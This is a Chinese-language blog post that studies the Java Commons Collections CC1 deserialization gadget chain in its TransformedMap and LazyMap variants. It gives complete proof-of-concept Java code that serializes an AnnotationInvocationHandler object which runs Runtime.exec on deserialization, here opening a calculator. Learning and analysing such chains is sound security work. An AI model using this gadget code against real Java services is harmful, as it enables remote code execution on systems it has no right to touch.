---
title: "Java反序列化-CC1"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# java反序列化-CC1

cc链入门的第一条

## TransformedMap链

简单分析了一手，不是特别深入，不求甚解了属于是

### demo分析

先看这个demo：
~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
~~~

运行之后是可以弹出计算器的：

![QQ_1761185119255](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761185119255.png)

可以简单分析一下原理：

首先创建了一个ChainedTransformer的对象，里面是ConstantTransformer和InvokerTransformer，ConstantTransformer获取了当前环境的Runtime对象，而InvokerTransformer执行Runtime对象的exec方法来执行命令（这里是唤出计算器），接下来使用TransformedMap.decorate对新建的HashMap做修饰，只要这个map新增元素就会触发前面transformerChain中的回调，而接下来的put操作就触发了这个回调，最后导致弹出计算器

再详细看看这个transformerChain，每一次回调都会按顺序调用其中对象的tranform方法，当调用ConstantTransformer的transform方法，就会直接返回构造时传入的对象即我们设置的Runtime：

![QQ_1761187270706](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761187270706.png)

然后是InvokerTransformer，需要传⼊三个参数：

![QQ_1761187379283](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761187379283.png)

其transform方法会反射调用input对象（在这里就是上面ConstantTransformer返回的Runtime对象）的imethod方法，而这个方法以及参数就是我们上面传入的exec方法，参数为`open -a calculator`：
![QQ_1761187450060](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761187450060.png)

那么调用原理就很清晰了，接下来的问题是，怎么在反序列化的readObject中触发这样的调用链呢

### 反序列化中的调用

由于反序列化时不能手动往map中put元素，所以需要另想触发方法，而`sun.reflect.annotation.AnnotationInvocationHandler`是个不错的选择，我们看一下其中的readObject方法：
![QQ_1761189428553](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761189428553.png)

我们可以大致分析其代码逻辑：遍历map并依次设置值。所以只要让其满足条件触发这里的`memberValue.setValue`即可

因为前面使用TransformedMap.decorate包装的原因，这里的setValue会调用到AbstractInputCheckedMapDecorator的setValue()方法：
![image-20251023170816957](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251023170816957.png)

然后会调用起父类TransformedMap的checkSetValue()方法:

![QQ_1761210646074](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761210646074.png)

最后执行ChainedTransformer的Transform()方法触发我们前面设定的调用链：

![QQ_1761210677241](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761210677241.png)

于是我们可以创建一个AnnotationInvocationHandler对象，并将前面构造的HashMap设置进来，由于这里的`sun.reflect.annotation.AnnotationInvocationHandler`是在JDK内部的类，不能直接使用new来实例化，所以需要使用反射获取它的构造方法，并将其设置成外部可见的，再调用进行实例化，这里的第一个参数要求传入一个注解类型（即java.lang.annotation.Annotation的子接口，且其中必须含有至少一个方法，这里选择的Target.class）：

![QQ_1761190985098](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761190985098.png)

接下来我们增加序列化和反序列化功能的代码：

```
public static void serialize(Object obj) throws IOException {
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
    oos.writeObject(obj);
}
public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
    Object obj = ois.readObject();
    return obj;
}
```

尝试运行：
![image-20251023114358970](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251023114358970.png)

报错了，原因是我们获取的Runtime没有实现`java.io.Serializable`接口，所以是不能进行序列化的，那接下来就该反射登场了

### 反射调用Runtime

我们可以反射获取上下文的Runtime对象而不是类：

~~~java
Method f = Runtime.class.getMethod("getRuntime");
Runtime r = (Runtime) f.invoke(null);
r.exec("open -a calculator");
~~~

那么在反序列化中可以利用InvokerTransformer的transform方法来反射调用，所以我们可以写出如下的方法获取Runtime：

~~~java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
};
~~~

现在能够正常序列化和反序列化了，但是由于没有满足`AnnotationInvocationHandler`中的判断条件，所以还不能调用setvalue来触发命令执行：

![image-20251023145648808](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251023145648808.png)

### 最后的构造

分析一下`AnnotationInvocationHandler`的逻辑：

![QQ_1761203603023](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761203603023.png)

这里有两步判断：

* 第一步if会判断传入的map的键在注解里是否有对应方法，我们可以看到Target中的方法只有value：

  ![QQ_1761204130669](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761204130669.png)

  那我们就在map中put一个键值对，键值为value：

  ![QQ_1761204245059](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761204245059.png)

* 而第二个判断已经是满足的了：

  ![QQ_1761208350085](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761208350085.png)

  这里有两个判断，第一个是判断value是否为memberType类的实例，第二个是判断value对象是否为用来存异常的代理类的实例，二者均为false，所以总体为true，可以进入下一步

所以此时的payload构造就完毕了，再尝试执行：

![QQ_1761204991660](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761204991660.png)

此时的反序列化就能走到setvalue，触发RCE了，完整代码：
~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Yuy0ung");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outerMap);

        serialize(obj);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

### 总结

所以CC1最终的反序列化调用链就是：
~~~
ObjectInputStream -> readObject()
AnnotationInvocationHandler -> readObject()
AbstractInputCheckedMapDecorator -> setValue()
TransformedMap -> checkSetValue()
ChainedTransformer -> transform()
ConstantTransformer -> transform()
InvokerTransformer -> transform()
	Class.getMethod()
InvokerTransformer -> transform()
	Runtime.getRuntime()
InvokerTransformer -> transform()
	Runtime.exec()
~~~

另外在调试时可以知道，在AbstractInputCheckedMapDecorator -> setValue()中，会调用起父类TransformedMap的checkSetValue方法，从而执行ChainedTransformer的Transform

## CC1-LazyMap链

这条也是ysoserial使用的链子，主要就是使用的LazyMap而不是TransformedMap作为触发点

### LazyMap

在学习了TransformedMap调用链后，我们知道TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform ，我们可以看它的get方法：

![QQ_1761272439328](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761272439328.png)

这里也能看出来，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值

但是`sun.reflect.annotation.AnnotationInvocationHandler` 的readObject方法中并没有直接调用到Map的get方法，那我们怎么触发呢？

我们可以看到，`sun.reflect.annotation.AnnotationInvocationHandler`的invoke方法中调用了get：

![QQ_1761272805735](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761272805735.png)

那么又要怎么调用到 AnnotationInvocationHandler的invoke方法呢，这里就要用到动态代理

### 动态代理

使用动态代理：

~~~java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
~~~

学习过动态代理就知道：当代理对象上调用任意方法时，该方法会被自动转发到`InvocationHandler.invoke()`方法进行调用

再观察`sun.reflect.annotation.AnnotationInvocationHandler`，会发现实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到其中的invoke 方法，进而触发LazyMap的get方法

而我们知道在AnnotationInvocationHandler的readObject中，遍历Map(proxy)时会调用memberValues.entrySet方法：

![QQ_1761284448241](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761284448241.png)

所以这里可以作为LazyMap的触发点，那么可以开始构造了

### 构造

有了调用思路后就可以着手开始构造了，可以直接在transformdeMap链基础上修改

首先改为使用LazyMap包装我们的HashMap：
![QQ_1761274992662](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761274992662.png)

然后就是对`sun.reflect.annotation.AnnotationInvocationHandler`对象进行动态代理：

![QQ_1761275603979](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761275603979.png)

现在我们得到一个代理对象proxyMap，但不能直接对其进行序列化，因为反序列化的入口在AnnotationInvocationHandler的readObject方法，所以我们需要用AnnotationInvocationHandler来包装proxyMap:

![QQ_1761276992223](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761276992223.png)

此时我们再运行代码，就会发现能够在反序列化时命令执行了：
![QQ_1761277082294](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761277082294.png)

完整代码：

~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_LazyMap {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)constructor.newInstance(Target.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        Object obj = constructor.newInstance(Target.class, proxyMap);

        serialize(obj);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}

~~~

### 总结

完整调用链：

~~~
ObjectInputStream -> readObject()
AnnotationInvocationHandler -> readObject()
Map(Proxy) -> entrySet()
AnnotationInvocationHandler -> invoke()
LazyMap -> get()
ChainedTransformer -> transform()
ConstantTransformer -> transform()
InvokerTransformer -> transform()
	Class.getMethod()
InvokerTransformer -> transform()
	Runtime.getRuntime()
InvokerTransformer -> transform()
	Runtime.exec()
~~~

